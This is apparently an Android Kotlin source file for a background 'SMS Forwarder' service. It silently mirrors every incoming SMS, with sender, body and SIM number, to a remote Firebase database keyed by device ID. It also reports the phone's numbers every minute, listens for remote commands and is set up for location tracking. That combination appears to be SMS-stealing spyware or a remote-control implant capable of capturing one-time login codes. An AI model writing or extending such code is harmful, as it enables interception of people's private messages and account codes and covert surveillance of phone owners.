package com.smsforwarder.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine
import android.os.IBinder
import com.smsforwarder.R
import com.smsforwarder.ui.MainActivity
import com.smsforwarder.utils.ConfigReader
import com.smsforwarder.utils.DeviceUtils
import com.smsforwarder.utils.PrefsManager

class ForwarderService : Service() {

    companion object {
        const val NOTIFICATION_ID = 1001
        const val CHANNEL_ID = "sms_forwarder_channel"
        const val ACTION_STOP = "com.smsforwarder.ACTION_STOP"
        const val ACTION_CHECK_NOW = "com.smsforwarder.ACTION_CHECK_NOW"
        private const val TAG = "ForwarderService"
    }

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private lateinit var prefs: PrefsManager
    private var smsObserver: ContentObserver? = null
    private val smsMutex = Mutex()
    
    private lateinit var databaseRef: DatabaseReference
    private lateinit var commandHandler: CommandHandler
    private var isInitialized = false

    override fun onCreate() {
        super.onCreate()
        prefs = PrefsManager(this)

        val firebaseUrl = ConfigReader.getFirebaseUrl(this)
        val apiKey = ConfigReader.getApiKey(this)
        val applicationId = ConfigReader.getApplicationId(this)
        val projectId = ConfigReader.getProjectId(this)

        try {
            if (FirebaseApp.getApps(this).isEmpty()) {
                val options = FirebaseOptions.Builder()
                    .setApiKey(apiKey)
                    .setApplicationId(applicationId)
                    .setProjectId(projectId)
                    .setDatabaseUrl(firebaseUrl)
                    .build()
                FirebaseApp.initializeApp(this, options)
                Log.d(TAG, "✅ Firebase Initialized from config.json")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Firebase Init Failed: ${e.message}")
        }

        val deviceId = DeviceUtils.getUniqueDeviceId(this)
        databaseRef = FirebaseDatabase.getInstance(firebaseUrl).getReference("devices/$deviceId")
        commandHandler = CommandHandler(this, databaseRef)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    if (intent?.action == ACTION_STOP) {
        stopSelf()
        return START_NOT_STICKY
    }

    if (intent?.action == ACTION_CHECK_NOW) {
        checkForNewSms()
        return START_STICKY
    }

    createNotificationChannel()

    // Correct foreground type (dataSync + location)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        val foregroundType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

        startForeground(NOTIFICATION_ID, buildNotification(), foregroundType)
    } else {
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    if (!isInitialized) {
        isInitialized = true
        serviceScope.launch {
            if (prefs.lastSmsId == -1L) {
                prefs.lastSmsId = getLatestSmsId()
            }
            startObserving()
            startHeartbeatLoop()
            commandHandler.startListening()
            
            // Location bhi yahan se start kar sakte ho (optional)
            // LocationHelper(this@ForwarderService).fetchAndUploadLocation()
        }
    }

    return START_STICKY
}

    private fun startHeartbeatLoop() {
        serviceScope.launch {
            while (isActive) {
                try {
                    val simNumbers = mutableMapOf<String, String>()
                    if (ContextCompat.checkSelfPermission(this@ForwarderService, android.Manifest.permission.READ_PHONE_NUMBERS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        val subManager = getSubscriptionManager()
                        subManager?.activeSubscriptionInfoList?.forEachIndexed { index, info ->
                            @Suppress("DEPRECATION")
                            val number = info.number
                            val simName = if (index == 0) "SIM 1" else "SIM 2"
                            simNumbers[simName] = if (!number.isNullOrBlank()) number else "Not available"
                        }
                    }

                    val updates = mapOf(
                        "last_seen" to ServerValue.TIMESTAMP,
                        "status" to "online",
                        "phone_numbers" to simNumbers
                    )
                    databaseRef.updateChildren(updates)
                    Log.d(TAG, "🔄 Heartbeat updated")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Heartbeat Error: ${e.message}")
                }
                delay(60000)
            }
        }
    }

    private fun startObserving() {
        if (smsObserver != null) return
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                serviceScope.launch {
                    delay(500)
                    checkForNewSms()
                }
            }
        }
        try {
            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver!!)
        } catch (e: Exception) {
            Log.e(TAG, "SMS observer error", e)
        }
    }

    private fun checkForNewSms() {
        if (!prefs.isEnabled) return

        serviceScope.launch {
            smsMutex.withLock {
                try {
                    val lastId = prefs.lastSmsId
                    var newestId = lastId

                    data class PendingSms(val id: Long, val sender: String, val body: String, val date: Long, val simNumber: String)
                    val newMessages = mutableListOf<PendingSms>()

                    val cursor = contentResolver.query(
                        Uri.parse("content://sms/inbox"),
                        arrayOf(Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, "sub_id"),
                        "${Telephony.Sms._ID} > ?",
                        arrayOf(lastId.toString()),
                        "${Telephony.Sms._ID} ASC"
                    )

                    cursor?.use {
                        val idIdx = it.getColumnIndexOrThrow(Telephony.Sms._ID)
                        val addrIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                        val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                        val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
                        val subIdIdx = it.getColumnIndex("sub_id")

                        while (it.moveToNext()) {
                            val id = it.getLong(idIdx)
                            val sender = it.getString(addrIdx) ?: "Unknown"
                            val body = it.getString(bodyIdx) ?: ""
                            val date = it.getLong(dateIdx)
                            val subId = if (subIdIdx >= 0) it.getInt(subIdIdx) else -1

                            val simNumber = getSimNumber(subId)
                            newMessages.add(PendingSms(id, sender, body, date, simNumber))
                            if (id > newestId) newestId = id
                        }
                    }

                    for (sms in newMessages) {
                        val success = sendSmsToFirebaseSuspend(sms.sender, sms.body, sms.date, sms.simNumber)
                        if (success && sms.id > prefs.lastSmsId) {
                            prefs.lastSmsId = sms.id
                        } else if (!success) {
                            Log.e(TAG, "❌ Failed to upload SMS id ${sms.id}, stopping batch update.")
                            break
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "checkForNewSms error", e)
                }
            }
        }
    }

    private suspend fun sendSmsToFirebaseSuspend(sender: String, message: String, date: Long, simNumber: String): Boolean = suspendCoroutine { continuation ->
        val smsData = mapOf(
            "sender" to sender,
            "message" to message,
            "timestamp" to date,
            "sim_number" to simNumber
        )
        databaseRef.child("sms").push().setValue(smsData)
            .addOnSuccessListener {
                continuation.resume(true)
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Firebase SMS Error: ${e.message}")
                continuation.resume(false)
            }
    }

    private fun getSimNumber(subId: Int): String {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_NUMBERS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return "Not available"
        }
        return try {
            if (subId >= 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subManager = getSubscriptionManager()
                @Suppress("DEPRECATION")
                val number = subManager?.getActiveSubscriptionInfo(subId)?.number
                if (!number.isNullOrBlank()) number else "Not available"
            } else {
                "Not available"
            }
        } catch (e: Exception) {
            "Not available"
        }
    }

    private fun getSubscriptionManager(): SubscriptionManager? {
        return getSystemService(SubscriptionManager::class.java)
    }

    private fun getLatestSmsId(): Long {
        var id = 0L
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf(Telephony.Sms._ID),
                null, null,
                "${Telephony.Sms._ID} DESC LIMIT 1"
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    id = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getLatestSmsId error", e)
        }
        return id
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SMS Forwarder Background Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply { setShowBadge(false) }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val openIntent = Intent(this, MainActivity::class.java)
        val openPending = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("SMS Forwarder Active")
            .setContentText("Running in background to sync messages")
            .setOngoing(true)
            .setContentIntent(openPending)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        if (::commandHandler.isInitialized) {
            commandHandler.stopListening()
        }
        serviceJob.cancel()
    }
}
